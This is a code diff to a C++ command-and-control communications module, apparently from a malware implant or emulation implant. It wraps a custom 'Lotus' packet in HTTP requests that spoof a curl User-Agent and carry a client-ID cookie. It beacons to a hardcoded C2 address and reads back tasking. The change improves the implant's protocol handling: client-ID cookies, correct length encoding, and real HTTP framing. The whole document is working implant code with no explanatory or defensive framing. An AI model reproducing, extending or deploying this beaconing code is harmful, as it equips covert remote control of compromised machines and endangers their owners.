@@ -2,25 +2,28 @@
 
 #define EXPORT __attribute__((visibility("default")))
 
-std::string buildGETRequestString(std::string lotusPacket) {
+std::string buildGETRequestString(std::string clientID) {
     std::ostringstream buf;
 
     buf << "GET / HTTP/1.1\n";
     buf << "User-Agent: curl 7.64.2\n";
     buf << "Accept: */*\n";
     buf << "Connection: close\n";
-    buf << "Cookie: erp=" << lotusPacket;
+    buf << "Cookie: erp=" << clientID;
     buf << "\n\n";
 
     return buf.str();
 }
 
-std::string buildPOSTRequestString(std::string lotusPacket) {
+std::string buildPOSTRequestString(std::string lotusPacket, std::string clientID) {
     std::ostringstream buf;
 
     buf << "POST / HTTP/1.1\n";
     buf << "User-Agent: curl 7.64.2\n";
     buf << "Accept: */*\n";
+    if (clientID != "") {
+        buf << "Cookie: erp=" << clientID << "\n";
+    }
     buf << "Content-Length: " << std::to_string(lotusPacket.length()) << "\n";
     buf << "Content-Type: application/x-www-form-urlencoded\n\n";
     buf << lotusPacket;
@@ -33,12 +36,18 @@ void buildLotusHeader(unsigned char * head, int data_length, int key_length, uns
     memcpy(head, MAGIC_BYTES, sizeof(MAGIC_BYTES));
 
     // payload length (4 bytes)
-    unsigned char payload_length[] = { (unsigned char)data_length };
-    memcpy(&head[PAYLOAD_LENGTH_POS], payload_length, sizeof(payload_length));
+    unsigned char payload_length[4];
+    payload_length[0] = data_length & 0xFF;
+    payload_length[1] = (data_length >> 8) & 0xFF;
+    payload_length[2] = (data_length >> 16) & 0xFF;
+    payload_length[3] = (data_length >> 24) & 0xFF;
+    memcpy(&head[PAYLOAD_LENGTH_POS], payload_length, 4);
 
     // key length (2 bytes)
-    unsigned char key_length_char[] = { (unsigned char)key_length };
-    memcpy(&head[KEY_LENGTH_POS], key_length_char, sizeof(key_length_char));
+    unsigned char key_length_char[2];
+    key_length_char[0] = key_length & 0xFF;
+    key_length_char[1] = (key_length >> 8) & 0xFF;
+    memcpy(&head[KEY_LENGTH_POS], key_length_char, 2);
 
     memcpy(&head[INSTRUCTION_POS], instruction, sizeof(instruction));
 
@@ -52,40 +61,39 @@ void buildLotusHeader(unsigned char * head, int data_length, int key_length, uns
 }
 
 EXPORT
-void sendRequest(const char * type, const std::vector<unsigned char> data, unsigned char ** response, int ** response_length, unsigned char ** instruction) {
+void sendRequest(const char * type, const std::vector<unsigned char> data, unsigned char ** response, int ** response_length, unsigned char ** instruction, const char * clientID) {
     char httpGET[] = "GET";
     char httpPOST[] = "POST";
     std::string requestBody;
 
     std::string key = "";
 
-    unsigned char header[HEADER_LENGTH] = { 0 };
-    buildLotusHeader(header, data.size(), key.length(), *instruction);
-    std::vector<unsigned char> lotus_packet(header, header + HEADER_LENGTH);
-    
-    // append key after header
-    lotus_packet.insert(lotus_packet.end(), key.begin(), key.end());
-    
-    lotus_packet.insert(lotus_packet.end(), data.begin(), data.end());
-
-    // convert data to string for building HTTP request
-    std::string lotus_packet_str(lotus_packet.begin(), lotus_packet.end());
+    std::string clientIDStr = clientID;
 
     // build HTTP request string
     if (strcmp(type, httpGET) == 0) {
-        std::cout << "[COMMS] Received data to GET: " + lotus_packet_str << std::endl;
-        requestBody = buildGETRequestString(lotus_packet_str);
+        std::cout << "[COMMS] Received data to GET, setting cookie to: " + clientIDStr << std::endl;
+        requestBody = buildGETRequestString(clientIDStr);
     }
     else if (strcmp(type, httpPOST) == 0) {
+        unsigned char header[HEADER_LENGTH] = { 0 };
+        buildLotusHeader(header, data.size(), key.length(), *instruction);
+        std::vector<unsigned char> lotus_packet(header, header + HEADER_LENGTH);
+
+        // append key after header
+        lotus_packet.insert(lotus_packet.end(), key.begin(), key.end());
+
+        lotus_packet.insert(lotus_packet.end(), data.begin(), data.end());
+
+        // convert data to string for building HTTP request
+        std::string lotus_packet_str(lotus_packet.begin(), lotus_packet.end());
+
         std::cout << "[COMMS] Received data to POST: " + lotus_packet_str << std::endl;
-        requestBody = buildPOSTRequestString(lotus_packet_str);
+        requestBody = buildPOSTRequestString(lotus_packet_str, clientIDStr);
     }
     else {
         return;
     }
-
-    // uncomment to overwrite the request string while C2 doesn't have HTTP request functionality
-    requestBody = lotus_packet_str;
 
     // create socket
     std::string host = "10.37.129.4";
@@ -122,9 +130,14 @@ void sendRequest(const char * type, const std::vector<unsigned char> data, unsig
     bytes_read = read(sock, buffer, RESP_BUFFER_SIZE);
 
     if (bytes_read < 0) {
-        std::cout << "[COMMS] No response received" << std::endl;
+        std::cout << "[COMMS] No response received from C2" << std::endl;
         return;
+    } else if (bytes_read == 0){
+        std::cout << "[COMMS] Empty response received from C2" << std::endl;
+    } else {
+        std::cout << "[COMMS] Data received from C2" << std::endl;
     }
+
 
     // update response buffer and response length values for return to caller
     memcpy(*response, buffer, bytes_read);
